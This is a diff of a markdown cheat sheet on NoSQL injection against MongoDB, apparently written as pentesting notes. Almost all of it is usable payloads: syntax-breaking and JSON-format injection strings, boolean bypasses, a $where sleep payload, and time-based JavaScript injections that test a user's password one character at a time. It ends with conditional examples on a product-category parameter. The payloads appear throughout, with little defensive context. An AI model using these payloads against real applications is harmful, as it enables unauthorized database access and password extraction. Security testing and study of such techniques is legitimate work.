@@ -1,29 +1,43 @@
-# Basic operator difference between SQLi && NoSQLi
-  1. ```or``` >> ```||```
-  2. ```and``` >> ```&&```
-  3. ```-- -``` >> ```%00``` 
-# Detecting NoSQLi Vulnerability
+### Basic operator difference between SQLi && NoSQLi
+  1. `or` >> `||`
+  2. `and` >> `&&`
+  3. `-- -` >> `%00`
+---
+### Detecting NoSQLi Vulnerability
+**For MongoDB Detection:**
+```
+'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+```
+**Causing syntax error in MongoDB**
 ```
 '
+```
+**Escaping the syntax error in MongoDB**
+```
 \'
+```
+**Injecting in JSON Format**
+```
+'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
+```
+**Others :**
+```
 '+%26%26+1%3d%3d1%00
 '+||+1%3d%3d1%00
 '||1||'
-'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
 '\"`{\r%3b$Foo}\n$Foo+\\xYZ\u0000
 {"$where": "sleep(5000)"}
 admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
 admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
 ```
-# Confirming conditional behavior
+### Confirming conditional behavior
 ```
 ' && 0 && 'x
 ' && 1 && 'x
 ' || 1 || 'x
 '%00
 ```
-You can also remove the ```x``` end of the payload.
-## Example with explanation:
+**Example with explanation :**
 
   1. ```category=Gifts' && 0 && 'x``` >> This will return no items like ```category=Gifts' and 1=0-- -``` in sql injection.
   2. ```category=Gifts' && 1 && 'x``` >> This will return Gift items like ```category=Gifts' and 1=1-- -``` in sql injection.
